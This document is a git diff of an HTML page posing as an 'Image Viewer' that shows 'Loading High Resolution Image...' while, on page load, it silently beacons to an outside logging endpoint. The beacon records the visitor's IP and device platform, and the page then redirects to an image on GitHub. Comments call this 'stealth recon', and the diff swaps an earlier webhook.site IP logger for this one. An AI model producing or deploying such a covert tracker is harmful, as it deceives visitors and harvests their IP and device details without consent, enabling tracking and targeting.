@@ -1,23 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>Image Viewer</title>
     <script>
         function runPayload() {
-            // 1. The Destination Image
+            // YOUR ACTIVE BEECEPTOR ENDPOINT
+            const hook = "https://bluekama-project.free.beeceptor.com";
             const bait = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
             
-            // 2. Your ACTIVE Webhook ID
-            const hook = "https://webhook.site/6fae6e2c-a6c9-4848-85fc-38146e2feba2";
-            
-            // 3. THE FORCE REDIRECT
-            // This sends the browser to the webhook, which logs the IP, 
-            // and the 'redirect' parameter tells the webhook where to send the user next.
-            window.location.href = hook + "?status=landed&redirect=" + encodeURIComponent(bait);
+            // THE STEALTH RECON (Logs IP and Device)
+            navigator.sendBeacon(hook + "/landed?device=" + navigator.platform);
+
+            // THE REDIRECT (Sends them to the image after 1.2s)
+            setTimeout(function() {
+                window.location.href = bait;
+            }, 1200);
         }
         window.onload = runPayload;
     </script>
 </head>
-<body style="background-color: black;">
+<body style="background-color: black; display: flex; justify-content: center; align-items: center; height: 100vh;">
+    <p style="color: white; font-family: sans-serif;">Loading High Resolution Image...</p>
 </body>
 </html>
